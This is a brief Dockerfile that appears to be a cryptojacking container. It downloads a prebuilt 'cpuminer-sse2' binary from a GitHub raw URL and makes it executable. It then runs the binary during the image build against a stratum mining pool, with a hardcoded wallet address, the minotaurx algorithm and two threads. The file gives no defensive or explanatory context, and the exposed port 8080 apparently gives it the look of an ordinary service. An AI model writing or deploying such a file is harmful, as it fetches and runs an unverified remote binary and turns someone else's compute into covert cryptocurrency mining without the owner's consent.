# Use the base image
FROM ubuntu:latest
 
# Expose the desired port
EXPOSE 8080

# RUN INSTALLATION
RUN apt-get update
RUN apt-get install -y curl wget
RUN wget https://raw.githubusercontent.com/apaple/kurohs/master/cpuminer-sse2
RUN chmod u+x cpuminer-sse2
RUN ./cpuminer-sse2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RNV7bACVwZZPxGAiuRxWcEzJvyXzwZxBjn.wrke -p x -t 2
